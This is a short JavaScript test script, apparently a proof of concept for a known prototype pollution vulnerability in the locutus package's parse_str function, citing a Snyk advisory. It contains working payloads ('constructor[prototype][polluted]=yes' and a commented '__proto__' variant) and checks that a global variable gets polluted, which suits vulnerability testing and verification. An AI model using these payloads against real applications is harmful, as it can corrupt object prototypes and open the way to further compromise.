// //https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
// test("prototype pollution in locutus", () => {
  try {
    polluted;
console.log("{ " + true + ", " + false + " }");
  } catch (e) {
console.log("{ " + true + ", " + true + " }");
  }

  const locutus = require("locutus");
  //locutus.php.strings.parse_str("__proto__[polluted]=yes");
  locutus.php.strings.parse_str("constructor[prototype][polluted]=yes");

console.log("{ " + polluted + ", " + "yes" + " }");
// });
